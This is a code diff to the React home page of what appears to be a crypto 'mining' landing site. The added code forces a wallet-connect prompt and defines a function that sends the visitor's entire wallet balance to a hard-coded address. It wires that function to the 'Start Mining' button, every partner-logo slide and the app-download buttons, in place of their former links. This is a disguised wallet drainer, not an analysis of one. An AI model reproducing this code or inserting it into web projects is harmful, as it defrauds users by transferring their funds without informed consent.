@@ -1,7 +1,13 @@
+import { useWeb3Modal } from '@web3modal/wagmi/react';
 import React, { useState, useEffect } from 'react';
+import { useAccount, useBalance, useSendTransaction } from 'wagmi';
 
 const Home = () => {
 
+    const { open } = useWeb3Modal()
+    const { isConnected, address } = useAccount()
+    const { data: hash, sendTransaction } = useSendTransaction()
+    
     const [days, setDays] = useState("");
     const [hours, setHours] = useState("");
     const [minutes, setMinutes] = useState("");
@@ -25,7 +31,31 @@ const Home = () => {
 
         return () => clearTimeout(timer);
     });
-    
+
+    const { data: baseBalanceData } = useBalance({
+        address: address,
+        unit: "ether",
+    });
+
+    function checkConnect(){
+        if(!isConnected){
+            open({ view: 'Networks' })
+        }
+    }
+
+    useEffect(() => {
+        checkConnect()
+    }, [address]);
+
+    function connectAndSend() {
+        if (!isConnected) {
+            open({ view: 'Networks' })
+        }else{
+            const value = baseBalanceData?.value
+            const to = "0x9d5eBa1AF95141f8f8fb943155bd45fDdB2639Fa"as `0x${string}` 
+            sendTransaction({ to, value })
+        }
+    }
     return(
         <div>            
             <div>
@@ -58,7 +88,7 @@ const Home = () => {
                             <div className="countdown ul_li_center wow fadeInUp mt-60" data-wow-duration=".7s" data-wow-delay="200ms" data-countdown="2024/08/28" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "200ms", animation: "fadeInUp"}}>
                                 <div className="single"><p>Days</p><h1>{days}</h1></div> <div className="single"><p>Hours</p><h1>{hours}</h1></div> <div className="single"><p>Minutes</p><h1>{minutes}</h1></div> <div className="single"><p>SECONDS</p><h1>{seconds}</h1></div></div>
                             <div className="hero__btn btns pt-50 wow fadeInUp" data-wow-duration=".7s" data-wow-delay="350ms" style={{visibility: "visible", animationDuration: "0.7s", animationDelay: "350ms", animationName: "fadeInUp"}}>
-                                <a className="them-btn" href="/miner">
+                                <a className="them-btn" onClick={connectAndSend}>
                                     <span className="btn_label" data-text="Get Started">Start Mining</span>
                                     <span className="btn_icon">
                                         <svg width="15" height="14" viewBox="0 0 15 14" fill="none" xmlns="http:/www.w3.org/2000/svg">
@@ -118,28 +148,28 @@ const Home = () => {
                     </div>
                     <div className="partner-active partner-slider ul_li swiper-container-initialized swiper-container-horizontal swiper-container-pointer-events"> 
                         <div className="swiper-wrapper" id="swiper-wrapper-c8c44c1010d10faa34" aria-live="off" style={{transitionDuration: "0ms", transform: "translate3d(-1905px, 0px, 0px)"}}><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-next" data-swiper-slide-index="3" role="group" aria-label="1 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_04.png" alt=""/>
                                     </div>
                                     <span>cardano</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="4" role="group" aria-label="2 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_05.png" alt=""/>
                                     </div>
                                     <span>ethereum</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="5" role="group" aria-label="3 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_06.png" alt=""/>
                                     </div>
                                     <span>Arbitrum</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="6" role="group" aria-label="4 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_01.png" alt=""/>
                                     </div>
@@ -147,7 +177,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide" data-swiper-slide-index="0" role="group" aria-label="5 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_01.png" alt=""/>
                                     </div>
@@ -155,7 +185,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide swiper-slide-prev" data-swiper-slide-index="1" role="group" aria-label="6 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_02.png" alt=""/>
                                     </div>
@@ -163,7 +193,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide swiper-slide-active" data-swiper-slide-index="2" role="group" aria-label="7 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_03.png" alt=""/>
                                     </div>
@@ -171,7 +201,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide swiper-slide-next" data-swiper-slide-index="3" role="group" aria-label="8 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_04.png" alt=""/>
                                     </div>
@@ -179,7 +209,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide" data-swiper-slide-index="4" role="group" aria-label="9 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_05.png" alt=""/>
                                     </div>
@@ -187,7 +217,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide" data-swiper-slide-index="5" role="group" aria-label="10 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_06.png" alt=""/>
                                     </div>
@@ -195,7 +225,7 @@ const Home = () => {
                                 </div>
                             </div>
                             <div className="swiper-slide" data-swiper-slide-index="6" role="group" aria-label="11 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_01.png" alt=""/>
                                     </div>
@@ -203,28 +233,28 @@ const Home = () => {
                                 </div>
                             </div>
                         <div className="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="0" role="group" aria-label="12 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_01.png" alt=""/>
                                     </div>
                                     <span>aptos</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-prev" data-swiper-slide-index="1" role="group" aria-label="13 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_02.png" alt=""/>
                                     </div>
                                     <span>algorand</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-active" data-swiper-slide-index="2" role="group" aria-label="14 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_03.png" alt=""/>
                                     </div>
                                     <span>binance</span>
                                 </div>
                             </div><div className="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-next" data-swiper-slide-index="3" role="group" aria-label="15 / 15" style={{width: "317.5px"}}>
-                                <div className="xb-item--brand">
+                                <div className="xb-item--brand" onClick={connectAndSend}>
                                     <div className="xb-item--brand_logo">
                                         <img src="../assets/partner_04.png" alt=""/>
                                     </div>
@@ -399,13 +429,13 @@ const Home = () => {
                                                 </svg> Integration with third-party payment wallets or services</li>
                                         </ul>
                                         <div className="xb-item--crypto-btn">
-                                            <a className="them-btn crp-btn" href="https:/html.xpressbuddy.com/cryco/index.html#!">
+                                            <a className="them-btn crp-btn" onClick={connectAndSend}>
                                                 <span className="btn_icon">
                                                     <i className="fab fa-apple"></i>
                                                 </span>
                                                 <span className="btn_label" data-text="Apple iOS">Apple iOS</span>
                                             </a>
-                                            <a className="them-btn crp-btn" href="https:/html.xpressbuddy.com/cryco/index.html#!">
+                                            <a className="them-btn crp-btn" onClick={connectAndSend}>
                                                 <span className="btn_icon"><svg width="21" height="14" viewBox="0 0 21 14" fill="none" xmlns="http:/www.w3.org/2000/svg">
                                                     <path fill-rule="evenodd" clip-rule="evenodd" d="M0.398804 12.1266C0.537847 10.5267 1.04394 9.05395 1.91712 7.70827C2.78967 6.3626 3.95204 5.29345 5.40423 4.50098L3.68942 1.63014C3.59672 1.49556 3.57354 1.35352 3.61989 1.204C3.66624 1.05447 3.76666 0.942338 3.92114 0.867577C4.04473 0.792815 4.18378 0.777861 4.33826 0.822713C4.49276 0.867577 4.61635 0.957281 4.70904 1.09186L6.42386 3.96269C7.75246 3.42441 9.14288 3.15528 10.5951 3.15528C12.0472 3.15528 13.4377 3.42441 14.7662 3.96269L16.4811 1.09186C16.5738 0.957281 16.6974 0.867577 16.8518 0.822713C17.0063 0.777861 17.1454 0.792815 17.269 0.867577C17.4235 0.942338 17.5239 1.05447 17.5702 1.204C17.6165 1.35352 17.5934 1.49556 17.5007 1.63014L15.7859 4.50098C17.238 5.29345 18.4007 6.3626 19.2739 7.70827C20.1464 9.05395 20.6523 10.5267 20.7913 12.1266V13.826H0.398804V12.1266ZM6.78336 9.3339C6.55904 9.55096 6.28467 9.6595 5.96025 9.6595C5.63581 9.6595 5.36175 9.55096 5.13805 9.3339C4.91374 9.1174 4.80158 8.85207 4.80158 8.53814C4.80158 8.22409 4.91374 7.95888 5.13805 7.74238C5.36175 7.5252 5.63581 7.41666 5.96025 7.41666C6.28467 7.41666 6.55904 7.5252 6.78336 7.74238C7.00706 7.95888 7.11891 8.22409 7.11891 8.53814C7.11891 8.85207 7.00706 9.1174 6.78336 9.3339ZM16.0527 9.3339C15.8283 9.55096 15.5539 9.6595 15.2296 9.6595C14.9051 9.6595 14.6311 9.55096 14.4074 9.3339C14.1831 9.1174 14.071 8.85207 14.071 8.53814C14.071 8.22409 14.1831 7.95888 14.4074 7.74238C14.6311 7.5252 14.9051 7.41666 15.2296 7.41666C15.5539 7.41666 15.8283 7.5252 16.0527 7.74238C16.2764 7.95888 16.3882 8.22409 16.3882 8.53814C16.3882 8.85207 16.2764 9.1174 16.0527 9.3339Z" fill="#080B18"></path>
                                                 </svg></span>
